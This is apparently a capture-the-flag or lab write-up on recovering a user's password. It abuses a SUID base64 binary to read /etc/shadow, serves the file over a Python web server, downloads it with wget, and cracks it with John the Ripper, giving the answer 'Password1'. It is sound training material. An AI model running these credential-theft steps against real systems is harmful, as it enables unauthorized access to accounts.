What is the password of user2?

if we search for binaries whose SUID bit is set using:
‘find / -type f -perm -04000 -ls 2>/dev/null’
or
‘find / -perm -u=s -type f 2>/dev/null’ which looks nicer
we find the base64 binary. GTFObins (https://gtfobins.github.io/gtfobins/base64/#suid) says that files can be read with the following command:
‘base64 $file | base64 --decode’

To reveal user2's password this was done with the /etc/shadow file. The output was piped to a file in the /tmp directoy. This is also where a copy of the /etc/passwd file was placed.

Afterwards, since this machine has Python installed, a local webserver was started in the /tmp directoy:
‘python3 -m http.server 8080’

Then the aforementioned files were downloaded onto the attack box using wget.

On the attackbox the two files were first unshadowed:
unshadow <passwdfile> <shadowfile> > unshadow.txt

and then cracked using John the Ripper:
‘john --wordlist=/usr/share/wordlists/rockyou.txt unshadow.txt’

This then revealed user2's password to be ‘Password1’

Answer: Password1
